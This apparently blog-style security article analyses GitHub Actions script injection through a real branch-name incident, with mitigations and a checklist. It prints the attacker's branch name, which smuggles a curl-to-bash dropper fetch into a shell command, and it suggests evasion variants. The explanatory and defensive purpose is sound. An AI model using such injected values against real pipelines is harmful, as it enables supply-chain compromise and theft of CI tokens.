			<h1>Malware Insights: GitHub Actions Script Injection</h1>
			<article>
				<section>
					<p>
						It's time to talk about how DevOps and CI/CD pipelines work in general, and how the lack of
						sanitization of arbitrary input data leads to a false sense of security practices.
					</p>
				</section>
				<section>
					<h2 id="attack-vector">Attack Vector</h2>
					<p>
						GitHub Actions allow to execute code inside an isolated sandbox, which means that they also
						allow the execution of arbitrary code (which is kind of the point behind it). The particular
						problem, however, is that GitHub / GitLab / etc runners also allow to use variables in their
						templates, which will be printed out to the shell that's executing an
						<code>echo $variable</code>
						command.
					</p>
					<p>
						In each line of the GitHub Actions Log there is a specific
						<code>echo $variable</code>
						command which prints
						out the set
						<code>inputs</code>
						that are defined for each workflow. This also influences the UI as the log
						output is parsed and then used to update the UI with the state update inside the log. This might
						also lead to a potential XSS vector in the GitHub frontend, but has been unused/unproven at this
						time.
					</p>
					<p>
						The first incident of this new type of attack vector has been discovered as
						<a class="icon-github" href="https://github.com/advisories/GHSA-7x29-qqmq-v6qc" target="_blank">GHSA-7x29-qqmq-v6qc</a>
						,
						but I'm trying to describe the problem here and how potentially more context variables can be used
						for this type of infiltration.
					</p>
					<pre class="bash">
# Executed inside the GitHub runner
echo "github.event_name: pull_request_target"
# ...
echo "first_input_name: ${first_input_name}"
echo "second_input_name: ${first_input_name}"
# ...
					</pre>
				</section>
				<section>
					<h2 id="arbitrary-unsanitized-inputs">Arbitrary Unsanitized Inputs</h2>
					<p>
						This means, however, that every environment variable that's used inside an
						<code>action.yml</code>
						file can
						be potentially abused if the source for it contains arbitrary data that's not filtered to contain
						no special characters and no escape characters.
					</p>
					<p>
						In the recent example that happened to the
						<code>ultralytics/ultralytics</code>
						repository, the attacker used
						the following name as the pull request's branch name to execute their malware dropper. In order to
						avoid potential web app firewalls that block network traffic, the attacker alread avoided using an
						<code>https://</code>
						prefix, and hosted the malicious script code on a
						<code>gist</code>
						on github to avoid detection.
					</p>
					<p>
						The pull request's branch name
						:
					</p>
					<p><code>openimbot:$({curl,-sSfL,raw.githubusercontent.com/username/hash_of_gist/dropper.sh}${IFS}|${IFS}bash)</code></p>
					<p>
						In order to reproduce it you can also use different escaping techniques that avoid a crappy detection
						mechanism, similar to SQL injection. For example,
						<code>";;$(curl,...)</code>
						or a backslack or backtick using
						execution command might also work, as well as an invoked execution via a third-party command like
						<code>perl</code>
						,
						<code>node</code>
						or another REPL that supports execution via a CLI parameter.
					</p>
					<p>
						The above branch name led to the pull request action workflow being executed automatically, without
						any possibility to cancel it by concept, and lead to installing the malware via the executed
						<code>dropper.sh</code>
						file that also had access to all environment variables including the
						<code>GITHUB_TOKEN</code>
						and other lateral
						movement possibilities.
					</p>
					<p>
						The dropper then patched the generated zip/wheel files of the published python package later, and
						inserted the crypto miner in those packages, but that's an unimportant detail in this context.
					</p>
					<p>
						The problem is really that all environment variables and all variable inputs in GitHub Actions
						templates are vulnerable to this, meaning that they need extra sanitization/validation steps or
						to be avoided at all cost.
					</p>
					<p>
						Potentially vulnerable pull request action context variables at this point
						:
					</p>
					<ul>
						<li><code>github.ref</code></li>
						<li><code>github.base_ref</code></li>
						<li><code>github.head_ref</code></li>
						<li><code>github.workflow</code></li>
						<li><code>github.event.pull_request.title</code></li>
						<li><code>github.event.pull_request.body</code></li>
						<li><code>github.event.pull_request.base.label</code></li>
						<li><code>github.event.pull_request.base.ref</code></li>
						<li><code>github.event.pull_request.base.full_name</code></li>
						<li><code>github.event.pull_request.base.name</code></li>
						<li><code>github.event.pull_request.base.owner.login</code></li>
						<li><code>github.event.pull_request.head.label</code></li>
						<li><code>github.event.pull_request.head.ref</code></li>
						<li><code>github.event.pull_request.head.full_name</code></li>
						<li><code>github.event.pull_request.head.name</code></li>
						<li><code>github.event.pull_request.head.owner.login</code></li>
					</ul>
					<p>
						As you can see, a lot of meta data is passed down in the
						<code>JSON</code>
						data that comes from arbitrary sources.
						You should therefore be really cautious about what kind of data you include in your
						<code>action.yml</code>
						file.
					</p>
				</section>
				<section>
					<h2 id="mitigation">Mitigation</h2>
					<p>
						The obvious mitigation is to check for unsanitized input variables and to not allow them to be used in
						your repository's
						<code>action.yml</code>
						file. There are ongoing efforts at this time to build validators that not
						only validate the schema of an
						<code>action.yml</code>
						file, but also check against whether or not this could be
						potentially executed via template injection.
					</p>
					<p>
						The tool that I would recommend even though it's still in development is
						<a class="icon-github" href="https://github.com/woodruffw/zizmor" target="_blank">Zizmor</a>
						as the author of it is very security conscious and uses a defensive programming style.
					</p>
					<p>
						There might be some other tools available that are more stable but as far as I know these only validate
						against the schema, not against vulnerabilities or weaknesses.
					</p>
				</section>
				<section>
					<h2 id="security-checklist">Security Checklist</h2>
					<p>
						As this type of problem is a regular occuring one for future changes of the
						<code>action.yml</code>
						file, I would
						like to point out that this sort of issue needs regular ongoing audits and checks to prevent an infiltration
						of the build pipeline environment.
					</p>
					<p>
						This is a supply chain attack with lateral movement capabilities, and should be treated with the highest
						risk assessment as it's able to influence pretty much everything end-to-end in regards to how your software
						is compiled, built, updated, published etc.
					</p>
					<p>
						It might be fixable with a
						<code>pre-receive</code>
						hook that's running on the server-side in case your company uses
						a self-hosted GitHub/GitLab/Gitea/Gogs instance, but as of today there's no software available to check
						these sorts of issues before the potentially vulnerable branch name, user name, user email etc. lands on
						the server.
					</p>
					<p>
						Also keep in mind that as refs and blobs are hashed, this might make it harder for your Forensics team to
						check for this sort of attack vector, because evidence trails can be easily obfuscated with
						<code>git gc</code>
						and
						similar means that remove or modify the
						<code>blob</code>
						filesystem behind git.
					</p>
					<p>
						Everything that's already pushed and received by
						<code>git</code>
						in its
						<code>.git/objects/<ref></code>
						folder is potentially
						affected by mentioned issues, as the attacker can just run a shell command to include those files directly
						(even using git syntax), so that's something to be aware of, too.
					</p>
					<p>
						On every change of your GitHub/GitLab Actions
						:
					</p>
					<ul>
						<li>Don't run a Pull Request bot for untrusted members</li>
						<li>Specifically allowlist trusted members for Pull Request workflow runs</li>
						<li>Use only the minimum amount of information you need for the actions workflow to complete</li>
						<li>Check every environment variable for arbitrary sources</li>
						<li>Check every GitHub/GitLab actions context variable for arbitrary sources</li>
					</ul>
				</section>
				<section>
					<h2 id="personal-notes">Personal Notes</h2>
					<p>
						As this attack vector is quite new and didn't happen a lot in the past as a supply chain attack, there's
						potentially a lot more to investigate.
					</p>
					<p>
						As most alternatives to GitHub also include some form of CI/CD or actions automation, these softwares
						might also be affected. This means that there needs to be an audit for GitLab, Gitea, Gogs, and other
						alternatives to ensure that this type of arbitrary data input isn't executed inside a shell environment.
					</p>
					<p>
						My recommendation would be to not execute a runner inside a shell environment, at all, but that's where
						the DevOps crowd would not agree with me as they sure do love their shell magic.
					</p>
					<p>
						If I would have the time, I probably would implement a runner based on
						<a class="icon-github" href="https://github.com/traefik/yaegi" target="_blank">yaegi</a>
						or another typesafe interpreter instead of executing commands in a shell. But that is a huge amount of
						work to do end-to-end, and might therefore not be feasible for most companies alone.
					</p>
				</section>
				<section>
					<h2 id="pentesting-advice">Pentesting Advice</h2>
					<p>
						As the described technique above might not work in the future, I'd recommend to try out other shell
						escape techniques that either use REPLs to execute inlined scripts or that use different types of
						encodings to escape restricted shell environments.
					</p>
					<p>
						A good start is to read the following chapters of these books
						:
					</p>
					<ul>
						<li>PayloadsAllTheThings, Chapter <a class="icon-github" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md" target="_blank">Command Injection</a></li>
						<li>0xffsec Handbook, Chapter <a class="icon-website" href="https://0xffsec.com/handbook/shells/restricted-shells/" target="_blank">Restricted Shells</a></li>
					</ul>
